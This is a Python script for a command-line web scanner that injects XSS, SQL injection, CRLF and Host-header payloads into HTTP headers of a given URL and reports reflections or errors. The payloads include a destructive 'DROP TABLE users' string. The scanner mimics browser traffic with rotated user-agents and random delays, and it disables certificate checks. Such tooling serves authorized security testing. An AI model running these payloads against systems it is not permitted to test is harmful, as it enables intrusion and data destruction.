import requests
import time
import argparse
import random
import urllib3
from urllib.parse import urlparse

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HeaderInjectionDetector:
    def __init__(self, target_url, headers_to_test=None, custom_payloads=None, timeout=10, delay=1.0):
        """
        Initializes the Header Injection Detector.
        """
        self.target_url = target_url
        self.timeout = timeout
        self.delay = delay
        self.results = []
        
        # Realistic User-Agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]

        # Headers to Test
        self.headers_to_test = headers_to_test or [
            'User-Agent', 'Referer', 'X-Forwarded-For', 'Cookie', 
            'Accept-Language', 'X-Original-URL', 'Host'
        ]

        # UPDATED PAYLOADS: Added a 'Reflection' check
        # This is crucial because many sites encode XSS payloads, but still reflect the input.
        self.payloads = custom_payloads or {
            'Reflection': [
                "INJECT_TEST_MARKER_999", 
                "HEADER_INJECTION_CHECK_123"
            ],
            'XSS': [
                "<script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "\"onfocus=alert(1) autofocus=\""
            ],
            'SQLi': [
                "' OR '1'='1",
                "1; DROP TABLE users--"
            ],
            'CRLF_Log_Injection': [
                "valid%0d%0aInjected-Header: Hacked"
            ],
            'Host_Manipulation': [
                "evil.com"
            ]
        }

    def _generate_human_headers(self, injection_header, injection_value):
        """Generates headers mimicking a real browser."""
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
        }
        headers[injection_header] = injection_value
        return headers

    def get_baseline_response(self):
        """Sends a normal request to check if site is up."""
        try:
            print(f"[*] Establishing baseline for {self.target_url}...")
            headers = self._generate_human_headers("User-Agent", random.choice(self.user_agents))
            response = requests.get(self.target_url, headers=headers, timeout=self.timeout, verify=False)
            return response.status_code == 200
        except requests.RequestException as e:
            print(f"[!] Baseline request failed: {e}")
            return False

    def analyze_response(self, response, payload_type, payload):
        """
        Analyzes the response for signs of injection.
        Updated to prioritize simple reflection detection.
        """
        indicators = []
        response_text = response.text

        # 1. Reflection Check (The most reliable way to find injection points)
        # If the site reflects our unique marker, it means the header is processed and outputted.
        if payload_type == 'Reflection':
            if payload in response_text:
                indicators.append(f"HEADER REFLECTED: '{payload}' found in response body.")
        
        # 2. XSS Check
        if payload_type == 'XSS':
            if payload in response_text:
                indicators.append("XSS Payload reflected un-sanitized.")
            # Check for partial reflection if encoding is present (common false negative)
            elif "script" in response_text.lower() and "alert" in response_text.lower():
                 indicators.append("Partial XSS reflection (encoded).")

        # 3. SQLi Check
        if payload_type == 'SQLi':
            sql_errors = ["sql syntax", "mysql", "ORA-", "unterminated quoted string"]
            if any(err.lower() in response_text.lower() for err in sql_errors):
                indicators.append("SQL error message detected.")

        # 4. CRLF Check
        if payload_type == 'CRLF_Log_Injection':
            if "Injected-Header" in response.headers:
                indicators.append("CRLF Injection successful (Header Splitting).")

        # 5. Host Check
        if payload_type == 'Host_Manipulation':
            if payload in response_text:
                indicators.append("Host header value reflected in body.")

        return indicators if indicators else None

    def run(self):
        """Main execution loop."""
        if not self.get_baseline_response():
            print("[-] Target is not responding. Aborting scan.")
            return []

        print(f"[*] Starting Header Injection Scan on {len(self.headers_to_test)} headers...")
        print("[*] Using human-like headers and reflection detection.\n")

        for header_name in self.headers_to_test:
            print(f"[*] Testing Header: {header_name}...")
            
            for payload_type, payload_list in self.payloads.items():
                for payload in payload_list:
                    
                    # Logic optimization: Don't test Host header with non-Host payloads
                    if header_name == 'Host' and payload_type != 'Host_Manipulation':
                        continue

                    # Prepare headers
                    test_headers = self._generate_human_headers(header_name, payload)
                    
                    try:
                        start_time = time.time()
                        response = requests.get(
                            self.target_url, 
                            headers=test_headers, 
                            timeout=self.timeout,
                            allow_redirects=False,
                            verify=False 
                        )
                        
                        findings = self.analyze_response(response, payload_type, payload)

                        if findings:
                            result = {
                                'header': header_name,
                                'type': payload_type,
                                'payload': payload,
                                'indicators': findings,
                                'url': self.target_url,
                                'status': response.status_code
                            }
                            self.results.append(result)
                            # Immediate feedback
                            print(f"    [+] FOUND: {findings[0]}")

                        # Random delay
                        human_delay = self.delay + random.uniform(-0.5, 0.5)
                        if human_delay < 0: human_delay = 0
                        time.sleep(human_delay)

                    except requests.RequestException:
                        pass # Silently ignore connection errors for mass scanning

        return self.results

def main():
    parser = argparse.ArgumentParser(description="Header Injection Detector v3")
    parser.add_argument("url", help="Target URL (e.g., http://testphp.vulnweb.com)")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests")
    args = parser.parse_args()

    parsed = urlparse(args.url)
    if not parsed.scheme:
        args.url = "http://" + args.url

    detector = HeaderInjectionDetector(target_url=args.url, delay=args.delay)
    vulnerabilities = detector.run()

    print("\n" + "="*50)
    print(f"SCAN COMPLETE: {len(vulnerabilities)} potential issues found.")
    print("="*50)
    
    if len(vulnerabilities) > 0:
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"\n#{i}:")
            print(f"  Header   : {vuln['header']}")
            print(f"  Type     : {vuln['type']}")
            print(f"  Payload  : {vuln['payload']}")
            print(f"  Finding  : {vuln['indicators'][0]}")

if __name__ == "__main__":
    main()
